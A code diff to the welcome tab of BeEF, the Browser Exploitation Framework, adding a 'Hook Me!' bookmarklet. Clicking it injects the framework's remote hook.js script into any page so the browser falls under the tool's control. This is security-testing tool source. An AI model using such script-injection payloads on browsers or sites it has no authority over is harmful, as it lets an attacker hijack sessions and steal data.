@@ -6,6 +6,10 @@
 
 WelcomeTab = function() {
 
+    var hookURL = location.protocol+'%2f%2f'+location.hostname+(location.port ? ':'+location.port : '')+'%2fhook.js';
+    var bookmarklet = "javascript:%20(function%20()%20{%20var%20url%20=%20%27__HOOKURL__%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();"
+    bookmarklet = bookmarklet.replace(/__HOOKURL__/,hookURL);
+
     welcome = " \
               <div style='font:11px tahoma,arial,helvetica,sans-serif;width:500px' > \
               <p><img src='/ui/media/images/beef.jpg' alt='BeEF - The Browser Exploitation Framework' /></p><br /> \
@@ -13,6 +17,7 @@ WelcomeTab = function() {
               <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Getting Started</span></p><br />\
               <p>Welcome to BeEF!</p><br /> \
               <p>Before being able to fully explore the framework you will have to 'hook' a browser. To begin with you can point a browser towards the basic demo page <a href='/demos/basic.html' target='_blank'>here</a>, or the advanced version <a href='/demos/butcher/index.html' target='_blank'>here</a>.</p><br /> \
+              <p>If you want to hook ANY page (for debugging reasons of course), drag the following bookmarklet link into your browser's status bar, then simply click the shortcut on another page: <a href='__BOOKMARKLETURL__'>Hook Me!</a></p><br /> \
               <p>After a browser is hooked into the framework they will appear in the 'Hooked Browsers' panel on the left. Hooked browsers will appear in either an online or offline state, depending on how recently they have polled the framework.</p><br /> \
               <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Hooked Browsers</span></p><br />\
               <p>To interact with a hooked browser simply left-click it, a new tab will appear. \
@@ -46,7 +51,9 @@ WelcomeTab = function() {
               </div>\
               ";
 
-    WelcomeTab.superclass.constructor.call(this, {
+  welcome = welcome.replace(/__BOOKMARKLETURL__/,bookmarklet);
+
+  WelcomeTab.superclass.constructor.call(this, {
 	region:'center',
 	padding:'10 10 10 10',
 	html: welcome,
